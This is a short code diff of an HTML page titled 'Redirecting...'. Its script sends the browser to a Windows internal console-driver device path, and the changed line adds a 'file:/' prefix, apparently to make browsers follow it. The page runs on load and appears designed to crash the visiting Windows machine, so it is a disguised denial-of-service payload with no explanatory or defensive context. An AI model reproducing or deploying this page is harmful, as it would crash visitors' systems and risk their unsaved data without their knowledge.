@@ -3,7 +3,7 @@
 <head>
 <title>Redirecting...</title>
 <script>
-window.location.href = "\\.\globalroot\device\condrv\kernelconnect";
+window.location.href = "file:/\\.\globalroot\device\condrv\kernelconnect";
 </script>
 </head>
 
